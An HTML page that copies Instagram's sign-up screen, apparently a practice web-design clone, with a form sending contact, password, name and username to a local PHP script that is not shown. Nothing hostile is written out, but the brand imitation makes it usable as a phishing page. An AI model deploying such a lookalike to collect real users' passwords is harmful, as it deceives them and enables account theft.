<!DOCTYPE html>
<html lang="en">

<head>
    <title>Instagram - Sign Up Page</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.css">
    <link href="https://fonts.cdnfonts.com/css/instagram-sans-2" rel="stylesheet">
    <link rel="stylesheet" href="../bootstrap-5.3.8-dist/bootstrap-5.3.8-dist/css/bootstrap.min.css">
    <script src="../bootstrap-5.3.8-dist/bootstrap-5.3.8-dist/js/bootstrap.bundle.min.js"></script>
    <link rel="stylesheet" href="./style.css">
</head>

<body>
    <div class="container mt-5 w-50 col-12 col-lg-9 col-sm-3 col-md-6">
        <div class="row">
            <div style="background-color: black;" class="card mx-auto col-md-6 w-50 border rounded corner">
                <h1 id="title" style="color: #ffffff;" class="mt-4 mb-3 text-center"><b>Instagram</b></h1>
                <h6 class="text-center mb-3" style="color: #ffffff;">Sign up to see photos and videos <br> from your friends.</h6>
                <div class="text-center h-75 mb-3">
                    <a href="../Form/index.html" target="_blank" class="btn btn-primary h-100 w-75 btn-sm"> <i class="px-2 bi bi-facebook"></i><b>Log In with Facebook</b></a>
                </div>
                <hr style="color: #ffffff;"><button id="bttn" style="background-color: black; border: none;" class="mx-auto w-0 btn btn-primary">OR</button>
                <div class="mt-3">
                    <form action="./basic.php" method="POST">
                        <input type="text" name="mob" id="mobile" class="form-control mb-2" placeholder="Enter Mobile Number or Email" style="background-color: rgb(235, 235, 235);">
                        <input type="password" name="pass" id="password" class="form-control mb-2" placeholder="Enter Password" style="background-color: rgb(235, 235, 235);">
                        <input type="text" name="fname" id="name" class="form-control mb-2" placeholder="Enter Name" style="background-color: rgb(235, 235, 235);">
                        <input type="text" name="user_name" id="username" class="form-control mb-2" placeholder="Enter Username" style="background-color: rgb(235, 235, 235);">
                    
                    <p style="font-size: 75%; color: rgb(232, 232, 232);" class="mb-3 mt-3 mx-auto text-center w-75">
                        People who use our service may have uploaded your contact information to Instagram. <br><a href="https://www.facebook.com/help/instagram/261704639352628">Learn More</a>
                    </p>
                    <p style="font-size: 75%; color: rgb(232, 232, 232);" class="mb-3 mt-3 mx-auto text-center w-75">
                        By signing up, you agree to our <a href=""> Terms</a>, <a href=""> Privacy Policy</a> and <a href=""> Cookies Policy</a>.
                    </p>
                </div>
                <button onclick="validate()" id="submitButton" type="submit" class="text-center mx-auto mt-3 mb-3 btn btn-primary w-50 btn-sm">Sign Up</button>
                </form>
            </div>
        </div>
    </div>

    <script src="./script.js"></script>
</body>

</html>
